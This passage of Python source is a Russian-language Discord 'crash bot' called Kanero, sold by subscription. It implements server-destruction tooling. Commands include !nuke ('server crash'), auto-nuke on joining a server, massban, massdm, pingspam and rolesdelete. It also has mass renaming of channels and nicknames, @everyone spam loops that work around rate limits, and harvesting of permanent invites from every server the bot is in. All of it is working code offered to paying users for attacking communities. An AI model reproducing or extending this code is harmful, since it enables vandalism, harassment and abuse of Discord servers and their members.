                        lines.append(f"`{uid}` — *не найден*")
                embed = discord.Embed(title="✅ Whitelist", description="\n".join(lines), color=0x0a0a0a)
                embed.set_footer(text=f"☠️ Kanero  |  Всего: {len(config.WHITELIST)}")
                await message.channel.send(embed=embed)

        elif cmd_name == "inv":
            app_id = bot.user.id
            url = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot%20applications.commands"
            await message.channel.send(f"Добавить бота: {url}")

        elif cmd_name == "block_guild":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            try:
                gid = int(args.strip()) if args.strip() else guild.id
            except ValueError:
                await message.channel.send("Использование: `!block_guild <id>`")
                return
            if gid not in BLOCKED_GUILDS:
                BLOCKED_GUILDS.append(gid)
                save_blocked_guilds()
                g = bot.get_guild(gid)
                name_str = f"**{g.name}**" if g else f"`{gid}`"
                await message.channel.send(f"🔒 Сервер {name_str} заблокирован.")
            else:
                await message.channel.send("Сервер уже заблокирован.")

        elif cmd_name == "unblock_guild":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            try:
                gid = int(args.strip()) if args.strip() else guild.id
            except ValueError:
                await message.channel.send("Использование: `!unblock_guild <id>`")
                return
            if gid in BLOCKED_GUILDS:
                BLOCKED_GUILDS.remove(gid)
                save_blocked_guilds()
                g = bot.get_guild(gid)
                name_str = f"**{g.name}**" if g else f"`{gid}`"
                await message.channel.send(f"🔓 Сервер {name_str} разблокирован.")
            else:
                await message.channel.send("Сервер не был заблокирован.")

        elif cmd_name == "blocked_guilds":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            if not BLOCKED_GUILDS:
                await message.channel.send("Нет заблокированных серверов.")
            else:
                lines = []
                for gid in BLOCKED_GUILDS:
                    g = bot.get_guild(gid)
                    lines.append(f"`{gid}` — {g.name if g else 'неизвестен'}")
                await message.channel.send("🔒 Заблокированные серверы:\n" + "\n".join(lines))

        elif cmd_name == "pm_add":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            try:
                uid = int(args.strip())
                if uid not in PREMIUM_LIST:
                    PREMIUM_LIST.append(uid)
                    save_premium()
                if uid not in config.WHITELIST:
                    config.WHITELIST.append(uid)
                    save_whitelist()
                await message.channel.send(f"💎 `{uid}` получил **Premium** + добавлен в **Whitelist**.")
            except ValueError:
                await message.channel.send("Использование: `!pm_add <id>`")

        elif cmd_name == "pm_remove":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            try:
                uid = int(args.strip())
                if uid in PREMIUM_LIST:
                    PREMIUM_LIST.remove(uid)
                    save_premium()
                    await message.channel.send(f"✅ `{uid}` убран из Premium.")
                else:
                    await message.channel.send("Не найден в Premium.")
            except ValueError:
                await message.channel.send("Использование: `!pm_remove <id>`")

        elif cmd_name == "pm_list":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            if not PREMIUM_LIST:
                await message.channel.send("Premium список пуст.")
            else:
                lines = []
                for uid in PREMIUM_LIST:
                    try:
                        user = await bot.fetch_user(uid)
                        lines.append(f"`{uid}` — **{user}**")
                    except Exception:
                        lines.append(f"`{uid}` — *не найден*")
                embed = discord.Embed(title="💎 Premium список", description="\n".join(lines), color=0x0a0a0a)
                embed.set_footer(text=f"☠️ Kanero  |  Всего: {len(PREMIUM_LIST)}")
                await message.channel.send(embed=embed)

        elif cmd_name == "unban":
            if not args:
                await message.channel.send("Использование: `!unban <user_id>`")
                return
            try:
                uid = int(args.strip())
                user = await bot.fetch_user(uid)
                unbanned = 0
                failed = 0
                for g in bot.guilds:
                    try:
                        await g.unban(user, reason="unban by owner")
                        unbanned += 1
                    except Exception:
                        failed += 1
                embed = discord.Embed(
                    title="🔓 Разбан выполнен",
                    description=f"Пользователь: **{user}** (`{uid}`)\n✅ Разбанен на **{unbanned}** серверах\n❌ Не удалось на **{failed}** серверах",
                    color=0x0a0a0a
                )
                embed.set_footer(text="☠️ Kanero")
                await message.channel.send(embed=embed)
            except ValueError:
                await message.channel.send("Использование: `!unban <user_id>`")
            except discord.NotFound:
                await message.channel.send("❌ Пользователь не найден.")

        else:
            await message.channel.send(f"❌ Неизвестная команда `{cmd_name}`. Напиши `!owner_help`.")

    except Exception as e:
        await message.channel.send(f"❌ Ошибка: {e}")


@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # ── Управление через ЛС ──────────────────────────────────
    if isinstance(message.channel, discord.DMChannel):
        content = message.content.strip()

        # !help и !changelog — доступны ВСЕМ без вайтлиста
        if content == "!help":
            uid = message.author.id
            is_owner = (uid == config.OWNER_ID)
            is_prem = is_premium(uid)
            is_wl = is_whitelisted(uid)

            embed = discord.Embed(
                title="☠️ Kanero — CRASH BOT",
                description=(
                    "```\n"
                    "  ██████╗██████╗  █████╗ ███████╗██╗  ██╗\n"
                    " ██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║\n"
                    " ██║     ██████╔╝███████║███████╗███████║\n"
                    " ██║     ██╔══██╗██╔══██║╚════██║██╔══██║\n"
                    " ╚██████╗██║  ██║██║  ██║███████║██║  ██║\n"
                    "  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n"
                    "```"
                ),
                color=0x0a0a0a
            )
            if is_owner:
                access_str = "� **OWNER** — полный доступ ко всем командам"
            elif is_prem:
                access_str = "💎 **PREMIUM** — доступ к расширенным командам"
            elif is_wl:
                access_str = "✅ **Обычная подписка** — базовые команды доступны"
            else:
                access_str = "❌ **Нет подписки** — доступ к командам закрыт"

            embed.add_field(name="🔑 Твой уровень доступа", value=access_str, inline=False)
            embed.add_field(
                name="📋 ДОСТУПНО ВСЕМ",
                value="`!help` — это меню\n`!changelog` — история обновлений бота",
                inline=False
            )
            embed.add_field(
                name="✅ ОБЫЧНАЯ ПОДПИСКА",
                value=(
                    "`!nuke` · `!stop` · `!cleanup`\n"
                    "`!rename` · `!nicks_all`\n"
                    "`!webhooks` · `!auto_nuke on/off/info` · `!inv`\n"
                    "`/sp [кол-во] [текст]` · `/spkd [задержка] [кол-во] [текст]`"
                ),
                inline=False
            )
            embed.add_field(
                name="� PREMIUM",
                value=(
                    "`!nuke [текст]` — нюк со своим текстом\n"
                    "`!massban` · `!massdm` · `!spam` · `!pingspam`\n"
                    "`!rolesdelete`\n"
                    "`!serverinfo` · `!userinfo`\n"
                    "`!auto_super_nuke on/off/text/info`"
                ),
                inline=False
            )
            embed.add_field(
                name="� OWNER",
                value=(
                    "`!wl_add/remove/list` · `!pm_add/remove/list`\n"
                    "`!block_guild / !unblock_guild / !blocked_guilds`\n"
                    "`!set_spam_text / !get_spam_text`\n"
                    "`!owl_add/remove/list`\n"
                    "`!guilds / !setguild / !invlink` (в ЛС)"
                ),
                inline=False
            )
            embed.add_field(
                name="💬 Купить подписку",
                value="Discord: **davaidkatt**\nTelegram: **@Firisotik**",
                inline=False
            )
            embed.set_footer(text="☠️ Kanero  |  !changelog — история обновлений")
            embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
            await message.channel.send(embed=embed)
            return

        if content == "!changelog":
            ctx = await bot.get_context(message)
            await changelog(ctx)
            return

        # Всё остальное — только для вайтлиста
        if not is_whitelisted(message.author.id):
            return

        # !owner_help — список всех ЛС-команд (только OWNER_ID)
        if content == "!owner_help":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Нет доступа.")
                return
            embed = discord.Embed(
                title="💀 OWNER PANEL — Kanero",
                description=(
                    "```\n"
                    " ░█████╗░░██╗░░░░░░░██╗███╗░░██╗███████╗██████╗░\n"
                    " ██╔══██╗░██║░░██╗░░██║████╗░██║██╔════╝██╔══██╗\n"
                    " ██║░░██║░╚██╗████╗██╔╝██╔██╗██║█████╗░░██████╔╝\n"
                    " ██║░░██║░░████╔═████║░██║╚████║██╔══╝░░██╔══██╗\n"
                    " ╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║███████╗██║░░██║\n"
                    " ░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝\n"
                    "```\n"
                    "> 🔐 Только ты имеешь доступ к этому меню."
                ),
                color=0x0a0a0a
            )
            embed.add_field(
                name="🖥️ СЕРВЕРЫ",
                value=(
                    "`!guilds` — список серверов бота (кнопки выбора)\n"
                    "`!setguild <id>` — выбрать сервер по ID\n"
                    "`!invlink` — инвайт-ссылки со всех серверов"
                ),
                inline=False
            )
            embed.add_field(
                name="⚡ КОМАНДЫ НА СЕРВЕРЕ",
                value=(
                    "Выбери сервер → пиши команды прямо в ЛС:\n"
                    "`!nuke` · `!stop` · `!cleanup`\n"
                    "`!rename` · `!nsfw_all` · `!unnsfw_all`\n"
                    "`!nicks_all` · `!webhooks`\n"
                    "`!auto_nuke on/off/info`"
                ),
                inline=False
            )
            embed.add_field(
                name="💎 PREMIUM",
                value=(
                    "Даёт возможность использовать `!nuke [свой текст]`.\n\n"
                    "`!pm_add <id>` — выдать Premium\n"
                    "`!pm_remove <id>` — забрать Premium\n"
                    "`!pm_list` — список Premium пользователей"
                ),
                inline=False
            )
            embed.add_field(
                name="📝 ТЕКСТ НЮКА",
                value=(
                    "Дефолтный текст который используется при `!nuke` без аргументов.\n\n"
                    "`!set_spam_text <текст>` — сменить текст\n"
                    "`!get_spam_text` — показать текущий текст"
                ),
                inline=False
            )
            embed.add_field(
                name="🔒 БЛОКИРОВКА СЕРВЕРОВ",
                value=(
                    "Запрещает боту работать на сервере — никто из вайтлиста не сможет им воспользоваться там.\n\n"
                    "`!block_guild <id>` — заблокировать\n"
                    "`!unblock_guild <id>` — разблокировать\n"
                    "`!blocked_guilds` — список заблокированных"
                ),
                inline=False
            )
            embed.add_field(
                name="👑 OWNER WHITELIST",
                value=(
                    "`!owl_add <id>` — добавить\n"
                    "`!owl_remove <id>` — убрать\n"
                    "`!owl_list` — список"
                ),
                inline=False
            )
            embed.add_field(
                name="👁️ ДОСТУП (ПОДПИСЧИКИ)",
                value=(
                    "`!wl_add <id>` — выдать доступ\n"
                    "`!wl_remove <id>` — забрать доступ\n"
                    "`!wl_list` — список допущенных"
                ),
                inline=False
            )
            embed.set_footer(text="☠️ Kanero  |  Команды работают только в ЛС")
            embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
            await message.channel.send(embed=embed)
            return

        # !owl_add <id> — добавить в owner whitelist (только OWNER_ID)
        if content.startswith("!owl_add"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер может управлять owner whitelist.")
                return
            try:
                uid = int(content.split()[1])
                if uid not in config.OWNER_WHITELIST:
                    config.OWNER_WHITELIST.append(uid)
                    save_owner_whitelist()
                    await message.channel.send(f"✅ `{uid}` добавлен в owner whitelist.")
                else:
                    await message.channel.send("Уже в owner whitelist.")
            except (ValueError, IndexError):
                await message.channel.send("Использование: `!owl_add <id>`")
            return

        # !owl_remove <id> — убрать из owner whitelist (только OWNER_ID)
        if content.startswith("!owl_remove"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер может управлять owner whitelist.")
                return
            try:
                uid = int(content.split()[1])
                if uid in config.OWNER_WHITELIST:
                    config.OWNER_WHITELIST.remove(uid)
                    save_owner_whitelist()
                    await message.channel.send(f"✅ `{uid}` убран из owner whitelist.")
                else:
                    await message.channel.send("Не найден в owner whitelist.")
            except (ValueError, IndexError):
                await message.channel.send("Использование: `!owl_remove <id>`")
            return

        # !owl_list — показать owner whitelist (только OWNER_ID)
        if content == "!owl_list":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер может смотреть owner whitelist.")
                return
            if not config.OWNER_WHITELIST:
                await message.channel.send("Owner whitelist пуст.")
            else:
                lines = []
                for uid in config.OWNER_WHITELIST:
                    try:
                        user = await bot.fetch_user(uid)
                        lines.append(f"`{uid}` — **{user}**")
                    except Exception:
                        lines.append(f"`{uid}` — *не найден*")
                embed = discord.Embed(title="👑 Owner Whitelist", description="\n".join(lines), color=0x0a0a0a)
                embed.set_footer(text=f"☠️ Kanero  |  Всего: {len(config.OWNER_WHITELIST)}")
                await message.channel.send(embed=embed)
            return

        # !guilds — показать список серверов с кнопками выбора
        if content == "!guilds":
            guilds = list(bot.guilds)
            if not guilds:
                await message.channel.send("Бот не на серверах.")
                return
            lines = "\n".join(f"`{g.id}` — {g.name}" for g in guilds)
            view = GuildSelectView(guilds, message.author.id)
            current = active_guild.get(message.author.id)
            current_name = bot.get_guild(current).name if current and bot.get_guild(current) else "не выбран"
            await message.channel.send(
                f"Серверы бота (активный: **{current_name}**):\n{lines}\n\nВыбери сервер кнопкой:",
                view=view
            )
            return

        # !invlink — прислать инвайт-ссылки со всех серверов
        if content == "!invlink":
            if not bot.guilds:
                await message.channel.send("Бот не на серверах.")
                return
            lines = []
            for g in bot.guilds:
                try:
                    ch = next((c for c in g.text_channels if c.permissions_for(g.me).create_instant_invite), None)
                    if ch:
                        inv = await ch.create_invite(max_age=0, max_uses=0, unique=True)
                        lines.append(f"**{g.name}** — {inv.url}")
                    else:
                        lines.append(f"**{g.name}** — нет прав на создание инвайта")
                except Exception as e:
                    lines.append(f"**{g.name}** — ошибка: {e}")
            await message.channel.send("\n".join(lines))
            return

        # !setguild <id> — выбрать сервер вручную по ID
        if content.startswith("!setguild "):
            try:
                gid = int(content.split()[1])
                guild = bot.get_guild(gid)
                if not guild:
                    await message.channel.send("Сервер не найден.")
                    return
                active_guild[message.author.id] = gid
                await message.channel.send(f"✅ Активный сервер: **{guild.name}**")
            except (ValueError, IndexError):
                await message.channel.send("Использование: `!setguild <id>`")
            return

        # !block_guild [id] — заблокировать сервер (только OWNER_ID)
        if content.startswith("!block_guild"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            parts = content.split()
            try:
                gid = int(parts[1]) if len(parts) > 1 else None
            except ValueError:
                await message.channel.send("Использование: `!block_guild <id>`")
                return
            if not gid:
                await message.channel.send("Укажи ID сервера: `!block_guild <id>`")
                return
            if gid not in BLOCKED_GUILDS:
                BLOCKED_GUILDS.append(gid)
                save_blocked_guilds()
                g = bot.get_guild(gid)
                name_str = f"**{g.name}**" if g else f"`{gid}`"
                await message.channel.send(f"🔒 Сервер {name_str} заблокирован. Бот не будет выполнять команды на нём.")
            else:
                await message.channel.send("Сервер уже заблокирован.")
            return

        # !unblock_guild [id] — разблокировать сервер (только OWNER_ID)
        if content.startswith("!unblock_guild"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            parts = content.split()
            try:
                gid = int(parts[1]) if len(parts) > 1 else None
            except ValueError:
                await message.channel.send("Использование: `!unblock_guild <id>`")
                return
            if not gid:
                await message.channel.send("Укажи ID сервера: `!unblock_guild <id>`")
                return
            if gid in BLOCKED_GUILDS:
                BLOCKED_GUILDS.remove(gid)
                save_blocked_guilds()
                g = bot.get_guild(gid)
                name_str = f"**{g.name}**" if g else f"`{gid}`"
                await message.channel.send(f"🔓 Сервер {name_str} разблокирован.")
            else:
                await message.channel.send("Сервер не был заблокирован.")
            return

        # !blocked_guilds — список заблокированных серверов (только OWNER_ID)
        if content == "!blocked_guilds":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            if not BLOCKED_GUILDS:
                await message.channel.send("Нет заблокированных серверов.")
            else:
                lines = []
                for gid in BLOCKED_GUILDS:
                    g = bot.get_guild(gid)
                    lines.append(f"`{gid}` — {g.name if g else 'неизвестен'}")
                await message.channel.send("🔒 Заблокированные серверы:\n" + "\n".join(lines))
            return

        # !pm_add <id> — выдать premium (только OWNER_ID)
        if content.startswith("!pm_add"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            parts = content.split()
            try:
                uid = int(parts[1]) if len(parts) > 1 else None
            except ValueError:
                await message.channel.send("Использование: `!pm_add <id>`")
                return
            if not uid:
                await message.channel.send("Укажи ID: `!pm_add <id>`")
                return
            if uid not in PREMIUM_LIST:
                PREMIUM_LIST.append(uid)
                save_premium()
                await message.channel.send(f"💎 `{uid}` получил **Premium** — кастомный текст для `!nuke` разблокирован.")
            else:
                await message.channel.send("Уже в Premium.")
            return

        # !pm_remove <id> — забрать premium (только OWNER_ID)
        if content.startswith("!pm_remove"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            parts = content.split()
            try:
                uid = int(parts[1]) if len(parts) > 1 else None
            except ValueError:
                await message.channel.send("Использование: `!pm_remove <id>`")
                return
            if not uid:
                await message.channel.send("Укажи ID: `!pm_remove <id>`")
                return
            if uid in PREMIUM_LIST:
                PREMIUM_LIST.remove(uid)
                save_premium()
                await message.channel.send(f"✅ `{uid}` убран из Premium.")
            else:
                await message.channel.send("Не найден в Premium.")
            return

        # !pm_list — список premium (только OWNER_ID)
        if content == "!pm_list":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            if not PREMIUM_LIST:
                await message.channel.send("Premium список пуст.")
            else:
                lines = []
                for uid in PREMIUM_LIST:
                    try:
                        user = await bot.fetch_user(uid)
                        lines.append(f"`{uid}` — **{user}**")
                    except Exception:
                        lines.append(f"`{uid}` — *не найден*")
                embed = discord.Embed(title="💎 Premium список", description="\n".join(lines), color=0x0a0a0a)
                embed.set_footer(text=f"☠️ Kanero  |  Всего: {len(PREMIUM_LIST)}")
                await message.channel.send(embed=embed)
            return

        # !set_spam_text <текст> — сменить дефолтный текст для !nuke (только OWNER_ID)
        if content.startswith("!set_spam_text"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            parts = content.split(maxsplit=1)
            if len(parts) < 2 or not parts[1].strip():
                await message.channel.send(
                    "Использование: `!set_spam_text <текст>`\n"
                    f"Текущий текст:\n```{config.SPAM_TEXT[:500]}```"
                )
                return
            new_text = parts[1]
            global AUTO_SUPER_NUKE_TEXT, AUTO_SUPERPR_NUKE_TEXT
            config.SPAM_TEXT = new_text
            AUTO_SUPER_NUKE_TEXT = new_text
            AUTO_SUPERPR_NUKE_TEXT = new_text
            save_spam_text()
            save_auto_super_nuke()
            save_auto_superpr_nuke()
            embed = discord.Embed(
                title="✅ Текст нюка обновлён",
                description=f"```{new_text[:1000]}```",
                color=0x0a0a0a
            )
            embed.set_footer(text="☠️ Kanero  |  Обновлено: все нюки")
            await message.channel.send(embed=embed)
            return

        # !get_spam_text — показать текущий текст (только OWNER_ID)
        if content == "!get_spam_text":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            embed = discord.Embed(
                title="📋 Текущий текст нюка",
                description=f"```{config.SPAM_TEXT[:1000]}```",
                color=0x0a0a0a
            )
            embed.set_footer(text="☠️ Kanero")
            await message.channel.send(embed=embed)
            return

        # Любая другая команда — выполняем на активном сервере
        # Служебные ЛС-команды никогда не отправляются на сервер
        DM_ONLY_COMMANDS = (
            "!help", "!changelog", "!owner_help", "!guilds", "!invlink",
            "!owl_add", "!owl_remove", "!owl_list",
            "!setguild", "!block_guild", "!unblock_guild", "!blocked_guilds",
            "!pm_add", "!pm_remove", "!pm_list",
            "!set_spam_text", "!get_spam_text",
        )
        if any(content == cmd or content.startswith(cmd + " ") for cmd in DM_ONLY_COMMANDS):
            return

        if content.startswith("!") and content != "!":
            gid = active_guild.get(message.author.id)
            if not gid:
                # Сервер не выбран — предлагаем выбрать
                guilds = list(bot.guilds)
                if not guilds:
                    await message.channel.send("Бот не на серверах.")
                    return
                lines = "\n".join(f"`{g.id}` — {g.name}" for g in guilds)
                view = GuildSelectView(guilds, message.author.id)
                await message.channel.send(
                    f"Сервер не выбран. Выбери на каком выполнить `{content}`:\n{lines}",
                    view=view
                )
                # Сохраняем команду чтобы выполнить после выбора — не делаем, просто просим выбрать
                return
            guild = bot.get_guild(gid)
            if not guild:
                await message.channel.send("Активный сервер недоступен. Выбери другой через `!guilds`.")
                active_guild.pop(message.author.id, None)
                return
            await run_dm_command(message, guild, content)
            return

    # ── Обычная обработка на сервере ────────────────────────
    if message.guild and is_guild_blocked(message.guild.id):
        return  # Сервер заблокирован — игнорируем всё

    # ── Канал addbot на домашнем сервере — выдаём freelist ──────────────────────
    if (message.guild and message.guild.id == HOME_GUILD_ID
            and ("addbot" in message.channel.name.lower())
            and not message.author.bot):
        try:
            await message.delete()
        except Exception:
            pass
        if message.author.id == config.OWNER_ID:
            return
        uid = message.author.id
        if uid in FREELIST:
            try:
                await message.author.send(
                    embed=discord.Embed(
                        title="✅ У тебя уже есть базовый доступ",
                        description=(
                            "Ты уже в freelist — можешь использовать `!nuke` и `!auto_nuke`.\n\n"
                            "Для расширенного доступа напиши: **davaidkatt**"
                        ),
                        color=0x0a0a0a
                    ).set_footer(text="Kanero  |  davaidkatt")
                )
            except Exception:
                pass
        else:
            FREELIST.append(uid)
            save_freelist()
            try:
                await message.author.send(
                    embed=discord.Embed(
                        title="✅ Базовый доступ получен!",
                        description=(
                            "Ты добавлен в freelist.\n\n"
                            "**Доступные команды:**\n"
                            "`!nuke` — краш сервера\n"
                            "`!auto_nuke on/off` — авто-краш при входе бота\n\n"
                            "Для получения полного доступа (whitelist/premium) напиши:\n"
                            "Discord: **davaidkatt** | Telegram: **@Firisotik**\n\n"
                            "Наш сервер: https://discord.gg/JEspTXRW"
                        ),
                        color=0x0a0a0a
                    ).set_footer(text="Kanero  |  davaidkatt")
                )
            except Exception:
                pass
        return
    if message.content.strip() == "!" and is_whitelisted(message.author.id):
        ctx = await bot.get_context(message)
        await help_cmd(ctx)
        return
    await bot.process_commands(message)
    log.info("Команда от %s (%s) на сервере %s: %s", message.author, message.author.id, message.guild, message.content)


@bot.event
async def on_ready():
    global AUTO_SUPER_NUKE, AUTO_SUPER_NUKE_TEXT, SNUKE_CONFIG
    global AUTO_SUPERPR_NUKE, AUTO_SUPERPR_NUKE_TEXT
    global AUTO_OWNER_NUKE, AUTO_OWNER_NUKE_TEXT
    global BLOCKED_GUILDS, PREMIUM_LIST, OWNER_NUKE_LIST, FREELIST

    # ── Загрузка из MongoDB ──
    wl = await db_get("data", "whitelist")
    if wl is not None:
        config.WHITELIST = wl
    owl = await db_get("data", "owner_whitelist")
    if owl is not None:
        config.OWNER_WHITELIST = owl
    bl = await db_get("data", "blocked_guilds")
    if bl is not None:
        BLOCKED_GUILDS = bl
    pm = await db_get("data", "premium")
    if pm is not None:
        PREMIUM_LIST = pm
    st = await db_get("data", "spam_text")
    if st is not None:
        config.SPAM_TEXT = st
    asn = await db_get("data", "auto_super_nuke")
    if asn is not None:
        AUTO_SUPER_NUKE = asn.get("enabled", False)
        AUTO_SUPER_NUKE_TEXT = asn.get("text", None)
        if "config" in asn:
            SNUKE_CONFIG.update(asn["config"])
    aspn = await db_get("data", "auto_superpr_nuke")
    if aspn is not None:
        AUTO_SUPERPR_NUKE = aspn.get("enabled", False)
        AUTO_SUPERPR_NUKE_TEXT = aspn.get("text", None)

    aon = await db_get("data", "auto_owner_nuke")
    if aon is not None:
        AUTO_OWNER_NUKE = aon.get("enabled", False)
        AUTO_OWNER_NUKE_TEXT = aon.get("text", None)

    onl = await db_get("data", "owner_nuke_list")
    if onl is not None:
        OWNER_NUKE_LIST = onl

    fl = await db_get("data", "freelist")
    if fl is not None:
        FREELIST = fl

    bot.tree.clear_commands(guild=None)

    # Глобальная проверка для ВСЕХ slash-команд
    async def slash_guild_block(interaction: discord.Interaction) -> bool:
        if interaction.guild and is_guild_blocked(interaction.guild.id):
            embed = discord.Embed(description="🔒 Этот сервер заблокирован.", color=0x0a0a0a)
            embed.set_footer(text="☠️ Kanero")
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return False
        return True
    bot.tree.interaction_check = slash_guild_block

    # ── SLASH: доступны всем вайтлист ──────────────────────

    @bot.tree.command(name="sp", description="☠️ Спам сообщением")
    @app_commands.describe(count="Количество (макс 50)", text="Текст сообщения")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    @app_commands.checks.cooldown(1, 300, key=lambda i: (i.user.id, i.channel_id))
    async def sp(interaction: discord.Interaction, count: int, text: str):
        await interaction.response.defer(ephemeral=True)
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.followup.send(embed=embed, ephemeral=True); return
        if count > 50:
            await interaction.followup.send("❌ Максимум 50.", ephemeral=True); return
        mentions = discord.AllowedMentions(everyone=True, roles=True, users=True)
        await interaction.followup.send(f"💀 Запускаю спам: **{count}** сообщений.", ephemeral=True)
        for _ in range(count):
            try:
                await interaction.followup.send(text, ephemeral=False, allowed_mentions=mentions)
                await asyncio.sleep(0.5)
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(e.retry_after + 0.5)
            except Exception:
                pass

    @bot.tree.command(name="spkd", description="☠️ Спам с задержкой")
    @app_commands.describe(delay="Задержка в секундах", count="Количество (макс 50)", text="Текст сообщения")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def spkd(interaction: discord.Interaction, delay: int, count: int, text: str):
        await interaction.response.defer(ephemeral=True)
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.followup.send(embed=embed, ephemeral=True); return
        if count > 50:
            await interaction.followup.send("❌ Максимум 50.", ephemeral=True); return
        if delay < 0:
            await interaction.followup.send("❌ Задержка не может быть отрицательной.", ephemeral=True); return
        mentions = discord.AllowedMentions(everyone=True, roles=True, users=True)
        await interaction.followup.send(f"💀 Запускаю спам: **{count}** сообщений, задержка **{delay}с**.", ephemeral=True)
        for _ in range(count):
            try:
                await interaction.followup.send(text, ephemeral=False, allowed_mentions=mentions)
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(e.retry_after + 0.5)
            except Exception:
                pass
            await asyncio.sleep(max(delay, 0.5))

    @bot.tree.command(name="nuke", description="💀 Краш сервера")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_nuke(interaction: discord.Interaction):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        guild = interaction.guild
        if is_guild_blocked(guild.id):
            await interaction.response.send_message("🔒 Сервер заблокирован.", ephemeral=True); return
        if nuke_running.get(guild.id):
            await interaction.response.send_message("⚡ Краш уже запущен.", ephemeral=True); return
        nuke_running[guild.id] = True
        nuke_starter[guild.id] = interaction.user.id
        last_nuke_time[guild.id] = asyncio.get_running_loop().time()
        last_spam_text[guild.id] = config.SPAM_TEXT
        await interaction.response.send_message("💀 Краш запущен.", ephemeral=True)
        asyncio.create_task(do_nuke(guild, config.SPAM_TEXT, caller_id=interaction.user.id))

    @bot.tree.command(name="stop", description="⛔ Остановить краш")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_stop(interaction: discord.Interaction):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        uid = interaction.user.id
        guild = interaction.guild
        starter_id = nuke_starter.get(guild.id)

        if uid == config.OWNER_ID:
            nuke_running[guild.id] = False
            nuke_starter.pop(guild.id, None)
            await interaction.response.send_message("✅ Остановлено.", ephemeral=True); return

        if starter_id is None:
            nuke_running[guild.id] = False
            await interaction.response.send_message("✅ Остановлено.", ephemeral=True); return

        if starter_id == config.OWNER_ID:
            embed = discord.Embed(description="❌ Нюк запущен **овнером** — только он может остановить.", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return

        if is_premium(starter_id) and not is_premium(uid):
            embed = discord.Embed(description="❌ Нюк запущен **Premium** пользователем — обычная подписка не может остановить.", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return

        nuke_running[guild.id] = False
        nuke_starter.pop(guild.id, None)
        await interaction.response.send_message("✅ Остановлено.", ephemeral=True)

    @bot.tree.command(name="rename", description="⚡ Переименовать все каналы")
    @app_commands.describe(name="Новое название")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_rename(interaction: discord.Interaction, name: str):
        if not is_whitelisted(interaction.user.id):
            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
            await interaction.response.send_message(embed=embed, ephemeral=True); return
        await interaction.response.defer(ephemeral=True)
        await asyncio.gather(*[c.edit(name=name) for c in interaction.guild.channels], return_exceptions=True)
        await interaction.followup.send("✅ Готово.", ephemeral=True)

    @bot.tree.command(name="nicks_all", description="⚡ Сменить ники всем")
    @app_commands.describe(nick="Новый ник")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
    async def slash_nicks_all(interaction: discord.Interaction, nick: str):
        if not is_whitelisted(interaction.user.id):
